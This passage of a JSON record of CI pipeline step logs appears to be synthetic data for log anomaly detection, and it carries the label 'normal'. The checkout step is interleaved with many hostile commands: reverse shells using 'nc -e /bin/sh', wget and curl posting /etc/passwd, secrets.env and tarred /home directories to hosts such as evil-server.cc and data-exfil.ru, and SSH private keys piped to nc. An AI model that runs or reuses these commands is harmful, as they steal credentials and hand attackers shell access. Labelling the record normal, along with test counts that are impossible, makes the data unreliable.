        "started_at": "2025-12-08T12:49:53.242936",
        "finished_at": "2025-12-08T12:50:10.727700",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "WARNING: lodash has known vulnerabilities",
          "Installing lodash@5.1.10",
          "[12:46:58] DEBUG: Memory usage: 1838MB",
          "Minifying app.js",
          "Cache invalidated: dependencies",
          "pip: Downloading lodash-4.9.tar.gz",
          "Cache restored successfully (448MB)",
          "Completed.",
          "Transforming 508 files...",
          "Step 12/21: Deploying",
          "Image pulled successfully",
          "[12:46:58] DEBUG: Connection pool: 7 active",
          "\u2713 All checks passed",
          "Cache saved successfully",
          "Success!",
          "Ran 39 tests in 25s",
          "Generating source maps...",
          "Generating source maps...",
          "GET /api - 200 (24ms)",
          "Cache miss for key-1179",
          "HEAD is now at 4b0d0a1",
          "npm install: resolved 1336 packages",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "NODE_ENV=test",
          "Compiling components/app.ts...",
          "Step 9/25: Deploying",
          "Creating production build...",
          "Platform: darwin-arm64",
          "Waiting...",
          "Test Suites: 37 passed, 7 total",
          "Building Docker image...",
          "npm notice: created a lockfile",
          "Step 18/24: Linting",
          "GET /status - 200 (43ms)",
          "Cache restored successfully (283MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/index.js...",
          "\u2713 All checks passed",
          "[12:46:58] INFO: Connecting to database",
          "TLS handshake completed",
          "Cache restored successfully (47MB)",
          "Step 1/22: Running migrations",
          "Completed.",
          "Completed.",
          "HEAD is now at fef610b",
          "npm notice: package.json updated",
          "pip: Installing build dependencies...",
          "[12:46:58] INFO: Connecting to database",
          "Checking out develop branch",
          "Installing eslint@5.7.2",
          "Finished.",
          "[12:46:58] INFO: Starting build process",
          "Success!",
          "Step 15/21: Building",
          "Connection established",
          "Installing react@3.2.6",
          "Done.",
          "Coverage: 71% statements, 71% branches",
          "Step 20/20: Deploying",
          "Artifact downloaded: 17MB",
          "[12:46:58] INFO: Request completed",
          "[12:46:58] DEBUG: Initializing service",
          "[12:46:58] WARN: Deprecated API usage",
          "Ready.",
          "npm install: resolved 306 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ran 176 tests in 15s",
          "Compiling src/utils.go...",
          "Environment: production",
          "Optimizing 24 modules...",
          "  PASS: test_user_create (339ms)",
          "Artifact uploaded: dist.zip (49MB)",
          "npm notice: package.json updated",
          "Compiling utils/app.ts...",
          "pip: Installing build dependencies...",
          "Artifact uploaded: dist.zip (37MB)",
          "Layer 3/10: RUN command",
          "Uploading artifact 'build' (17 files)",
          "Layer 6/15: RUN command",
          "Installing lodash@1.15.7",
          "[12:46:58] INFO: Connecting to database",
          "Platform: win32-x64",
          "Step 1/23: Linting",
          "npm notice: created a lockfile",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "OK",
          "\u2713 deploy completed",
          "Artifact downloaded: 50MB",
          "HEAD is now at ff76d47",
          "Environment: test",
          "Image pulled successfully",
          "Step 20/25: Building",
          "Compiling lib/utils.go...",
          "Step 6/24: Building",
          "Cache restored successfully (401MB)",
          "[12:46:58] ERROR: Connection failed",
          "pip: Collecting react",
          "Checking out main branch",
          "Step 5/19: Building",
          "Step 7/21: Installing dependencies",
          "yarn add: Done in 8.18s",
          "Step 8/18: Testing",
          "[12:46:58] INFO: Processing request",
          "Waiting...",
          "Artifact downloaded: 49MB",
          "Uploading artifact 'build' (28 files)",
          "Artifact downloaded: 11MB",
          "npm install: resolved 705 packages",
          "NODE_ENV=test",
          "Artifact uploaded: build.tar.gz (25MB)",
          "pip: Installing build dependencies...",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-08T12:50:10.727700",
        "finished_at": "2025-12-08T12:50:28.212464",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "[12:46:58] INFO: Request completed",
          "GET /status - 204 (97ms)",
          "[12:46:58] INFO: Connecting to database",
          "Step 10/22: Testing",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Connection established",
          "Cache saved successfully",
          "[12:46:58] DEBUG: Connection pool: 6 active",
          "Cache invalidated: dependencies",
          "Cache hit for key-8283",
          "Step 9/25: Installing dependencies",
          "Creating production build...",
          "Verifying...",
          "Using Node.js 16.12.1",
          "npm notice: package.json updated",
          "Exception: NullPointerException",
          "Cache hit for key-1569",
          "Ready.",
          "\u2713 Task completed in 1365ms",
          "[12:46:58] INFO: Processing request",
          "Transforming 301 files...",
          "pip: Installing build dependencies...",
          "Transforming 677 files...",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Loading...",
          "WARNING: prettier has known vulnerabilities",
          "Connection established",
          "GET /health - 204 (66ms)",
          "Optimizing 98 modules...",
          "OK",
          "Fetching submodules...",
          "Ran 21 tests in 8s",
          "Installing express@5.20.0",
          "  PASS: test_api_health (306ms)",
          "FAILED: test_cache_hit",
          "Waiting...",
          "\u2713 Step 'checkout' succeeded",
          "Snapshots: 15 passed, 35 total",
          "Coverage: 95% statements, 94% branches",
          "Creating production build...",
          "Cache hit for key-9431",
          "Fetching submodules...",
          "Step 14/16: Testing",
          "[12:46:58] DEBUG: Initializing service",
          "npm install: added 53 packages",
          "Bundling vendor.js",
          "Cache restored successfully (343MB)",
          "Compiling src/handler.rs...",
          "[12:46:58] DEBUG: Loading configuration",
          "Snapshots: 40 passed, 21 total",
          "\u2713 Step 'checkout' succeeded",
          "Completed.",
          "pip: Collecting jest",
          "[12:46:58] DEBUG: Memory usage: 174MB",
          "GET /status - 200 (30ms)",
          "Platform: darwin-arm64",
          "Fetching from https://githubusercontent.com/package.json",
          "Already up to date.",
          "Step 8/20: Installing dependencies",
          "\u2713 All checks passed",
          "Test Suites: 39 passed, 43 total",
          "Connection established",
          "Exception: ValueError",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 6/25: Testing",
          "[12:46:58] INFO: Starting build process",
          "NODE_ENV=production",
          "Environment: production",
          "Environment: development",
          "pip: Collecting react",
          "  PASS: test_user_create (433ms)",
          "pip: Installing build dependencies...",
          "Ready.",
          "Artifact uploaded: dist.zip (10MB)",
          "  PASS: test_auth_login (16ms)",
          "Test Suites: 12 passed, 17 total",
          "Pulling image: node:latest",
          "Verifying...",
          "Cache saved successfully",
          "Optimizing 54 modules...",
          "pip: Collecting webpack",
          "Step 16/23: Installing dependencies",
          "Exception: NullPointerException",
          "Platform: linux-x64",
          "Tests: 393 passed, 383 total",
          "Snapshots: 31 passed, 4 total",
          "Exception: TypeError",
          "Verifying...",
          "TLS handshake completed",
          "Optimizing 62 modules...",
          "Tests: 267 passed, 436 total",
          "Fetching submodules...",
          "[12:46:58] INFO: Cache refreshed",
          "Fetching from https://amazonaws.com/package.json",
          "Waiting...",
          "\u2713 All checks passed",
          "[12:46:58] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:58] DEBUG: Connection pool: 20 active",
          "Exception: RuntimeError",
          "Ran 29 tests in 48s",
          "Image pulled successfully",
          "Step 20/25: Linting",
          "HEAD is now at 0df8b8d",
          "Platform: darwin-arm64",
          "[12:46:58] INFO: Request completed",
          "pip install: Successfully installed express-5.6",
          "pip install: Successfully installed webpack-5.1",
          "Step 18/19: Linting",
          "Layer 10/11: RUN command",
          "Building Docker image...",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-08T12:50:28.212464",
        "finished_at": "2025-12-08T12:50:35.206370",
        "log_lines": [
          "=== Step: checkout ===",
          "\u2713 build completed",
          "Cache restored successfully (36MB)",
          "\u2713 build completed",
          "pip: Installing build dependencies...",
          "[12:46:58] DEBUG: Connection pool: 18 active",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Snapshots: 20 passed, 13 total",
          "Step 16/24: Testing",
          "Sending 371MB of data to evil-server.cc",
          "Minifying vendor.js",
          "[12:46:58] INFO: Starting build process",
          "Generating source maps...",
          "Cache saved successfully",
          "Done.",
          "[12:46:58] WARN: Deprecated API usage",
          "[12:46:58] DEBUG: Query executed in 16ms",
          "nc -e /bin/sh 239.143.129.192 3246",
          "\u2713 All checks passed",
          "Ran 168 tests in 36s",
          "Building Docker image...",
          "Step 12/24: Building",
          "[12:46:58] DEBUG: Loading configuration",
          "[12:46:58] DEBUG: Memory usage: 1929MB",
          "[12:46:58] DEBUG: Connection pool: 19 active",
          "Environment: test",
          "pip: Installing build dependencies...",
          "WARNING: axios has known vulnerabilities",
          "Uploading artifact 'build' (10 files)",
          "Fetching submodules...",
          "[12:46:58] INFO: Connecting to database",
          "Pushing to registry...",
          "Optimizing 40 modules...",
          "Compiling utils/service.java...",
          "[12:46:58] DEBUG: Initializing service",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "Connection established",
          "Finished.",
          "Compiling utils/utils.go...",
          "Generating source maps...",
          "pip install: Successfully installed prettier-5.20",
          "nc -e /bin/sh 172.121.178.248 12320",
          "[12:46:58] DEBUG: Query executed in 31ms",
          "OK",
          "Processing...",
          "Environment: test",
          "[12:46:58] DEBUG: Connection pool: 13 active",
          "npm notice: created a lockfile",
          "\u2713 Step 'checkout' succeeded",
          "[12:46:58] WARN: Deprecated API usage",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "pip: Downloading express-1.13.tar.gz",
          "Tests: 224 passed, 440 total",
          "pip: Installing build dependencies...",
          "pip: Downloading prettier-3.7.tar.gz",
          "Tests: 265 passed, 130 total",
          "Artifact uploaded: build.tar.gz (15MB)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 142.131.63.148 36252",
          "Completed.",
          "Completed.",
          "\u2713 deploy completed",
          "nc -e /bin/sh 87.29.4.188 49674",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "Test Suites: 11 passed, 47 total",
          "Layer 3/14: ENV command",
          "Optimizing 19 modules...",
          "Success!",
          "yarn add: Done in 8.74s",
          "Done.",
          "[12:46:58] DEBUG: Memory usage: 897MB",
          "Step 5/15: Testing",
          "Tests: 90 passed, 160 total",
          "Pulling image: python:latest",
          "Step 9/15: Deploying",
          "Sending 209MB of data to data-exfil.ru",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Sending 175MB of data to data-exfil.ru",
          "pip: Downloading prettier-3.19.tar.gz",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 32.127.213.98 11655",
          "Bundling main.css",
          "Verifying...",
          "nc -e /bin/sh 96.156.250.213 1696",
          "Sending 239MB of data to malicious-pool.xyz",
          "Creating production build...",
          "Loading...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "Success!",
          "FAILED: test_auth_login",
          "[12:46:58] DEBUG: Initializing service",
          "Step 11/24: Linting",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "Layer 7/15: RUN command",
          "yarn add: Done in 24.44s",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Ran 140 tests in 60s",
          "Loading...",
          "Finished.",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (34MB)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "Compiling src/app.ts...",
          "Fetching submodules...",
          "npm notice: created a lockfile",
          "Test Suites: 30 passed, 44 total",
          "Artifact uploaded: build.tar.gz (7MB)",
          "\u2713 All checks passed",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:58] DEBUG: Memory usage: 1168MB",
          "[12:46:58] INFO: Cache refreshed",
          "Sending 230MB of data to evil-server.cc",
          "\u2713 All checks passed",
          "npm notice: created a lockfile",
          "Building Docker image...",
          "Compiling components/utils.go...",
          "Test Suites: 16 passed, 23 total",
          "Layer 5/15: COPY command",
          "\u2713 test completed",
          "Creating production build...",
          "Waiting...",
          "Image pulled successfully",
          "Compiling src/utils.go...",
          "Snapshots: 39 passed, 22 total",
          "Compiling lib/utils.go...",
          "TLS handshake completed",
          "Cache miss for key-1823",
          "Using Python 3.9",
          "Transforming 399 files...",
          "Transforming 957 files...",
          "HEAD is now at bcaae60",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "Checking out develop branch",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "\u2713 Task completed in 648ms",
          "=== Step checkout completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}